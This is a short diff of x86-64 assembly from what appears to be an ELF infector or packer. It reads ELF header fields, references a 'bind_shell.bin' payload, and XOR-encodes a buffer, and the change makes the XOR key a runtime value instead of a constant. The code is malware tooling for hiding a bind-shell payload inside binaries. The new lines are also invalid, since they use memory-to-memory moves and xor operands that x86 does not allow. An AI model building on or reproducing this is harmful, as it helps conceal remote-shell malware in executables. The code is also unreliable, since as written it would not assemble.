@@ -3,10 +3,10 @@ section .data
 	nomelf db "simple", 0
 	payload_name db "bind_shell.bin", 0
 
-    xor_key equ 0x5A
+    ;xor_key equ 0x5A
 section .bss
 	elfheader resb 64
-
+	xor_key resb 1
 	recup_e_entry resq 1
 	recup_e_phoff resq 1
 	recup_e_phentsize resw 1
@@ -278,6 +278,8 @@ xor_loop:
 
     cmp rcx, r14
     jge write_output
+
+	mov xor_key, [rsp + 32]
 
     xor byte [xor_buffer + rcx], xor_key        ; Modifie avec xor octet par octet
 
